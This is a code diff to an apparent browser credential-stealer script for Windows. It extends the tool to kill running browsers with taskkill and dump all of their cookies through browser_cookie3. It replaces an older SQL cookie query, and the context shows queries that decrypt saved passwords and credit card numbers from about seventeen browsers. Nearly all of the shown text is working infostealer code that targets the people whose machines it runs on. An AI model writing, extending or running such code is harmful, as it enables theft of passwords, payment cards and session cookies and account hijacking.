@@ -1,6 +1,8 @@
 from win32crypt import CryptUnprotectData
 from datetime import datetime, timedelta
 from Cryptodome.Cipher import AES
+import browser_cookie3
+import subprocess
 import tempfile
 import sqlite3
 import shutil
@@ -31,6 +33,26 @@ browsers = {
     'iridium': appdata + '\\Iridium\\User Data',
 }
 
+browser_names = {
+    'avast': 'avast',
+    'amigo': 'amigo',
+    'torch': 'torch',
+    'kometa': 'kometa',
+    'orbitum': 'orbitum',
+    'cent-browser': 'centbrowser',
+    '7star': '7star',
+    'sputnik': 'sputnik',
+    'vivaldi': 'vivaldi',
+    'google-chrome-sxs': 'chrome-sxs',
+    'google-chrome': 'chrome',
+    'epic': 'epic',
+    'microsoft-edge': 'edge',
+    'uran': 'uran',
+    'yandex': 'yandex',
+    'brave': 'brave',
+    'iridium': 'iridium',
+}
+
 data_queries = {
     'login_data': {
         'query': 'SELECT origin_url, action_url, username_value, password_value FROM logins',
@@ -42,12 +64,6 @@ data_queries = {
         'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
         'file': '\\Web Data',
         'columns': ['Name on card', 'Card number', 'Expires', 'Modified'],
-        'decrypt': True
-    },
-    'cookies': {
-        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
-        'file': '\\Network\\Cookies',
-        'columns': ['Host key', 'Name', 'Path', 'Cookie', 'Expires on'],
         'decrypt': True
     },
     'history': {
@@ -162,6 +178,22 @@ if __name__ == '__main__':
     available_browsers = installed_browsers()
 
     for browser in available_browsers:
+        bn = browser_names[browser]
+        try:
+            subprocess.run(['taskkill', '/f', '/im', f"{bn}.exe"])
+            cj = getattr(browser_cookie3, bn)()
+
+            for cookie in cj:
+                if cookie.secure == 1:
+                    cookie_secure = True
+                else:
+                    cookie_secure = False
+
+                content = f"{cookie.domain}\t{cookie_secure}\t{cookie.path}\t{cookie_secure}\t{cookie.expires}\t{cookie.name}\t{cookie.value}\n"
+                save_results(browser, "cookies", content)
+        except Exception as e:
+            print(e)
+
         browser_path = browsers[browser]
         master_key = get_master_key(browser_path)
 
